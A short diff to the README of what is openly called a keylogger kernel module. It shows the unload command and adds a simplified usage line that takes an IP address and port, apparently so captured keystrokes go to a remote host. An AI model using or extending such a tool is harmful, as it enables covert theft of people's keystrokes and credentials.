@@ -18,6 +18,12 @@ The log file will show the keystrokes logged after the module has been loaded.
 
 To uninstall the keylogger module:
 >sudo rmmod keylogger
+--------------------------------------------------
+we simplify that procedures
+
+> ./exe <IP> <PORT> 
+
+
 
 
 
